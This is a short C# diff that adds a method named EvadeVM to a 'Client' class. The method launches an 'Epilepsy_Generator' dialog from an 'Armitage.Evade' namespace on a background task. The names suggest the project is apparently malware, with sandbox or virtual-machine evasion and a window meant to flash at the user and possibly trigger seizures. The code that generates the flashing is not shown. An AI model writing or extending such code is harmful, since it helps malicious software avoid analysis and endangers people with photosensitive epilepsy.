@@ -250,5 +250,14 @@ namespace Client
 
             Console.WriteLine("Is First Run : " + Properties.Settings.Default.IsFirstRun.ToString());
         }
+        public static void EvadeVM()
+        {
+            Task.Run(() =>
+            {
+                Armitage.Evade.Epilepsy_Generator e = new Armitage.Evade.Epilepsy_Generator();
+
+                e.ShowDialog();
+            });
+        }
     }
 }
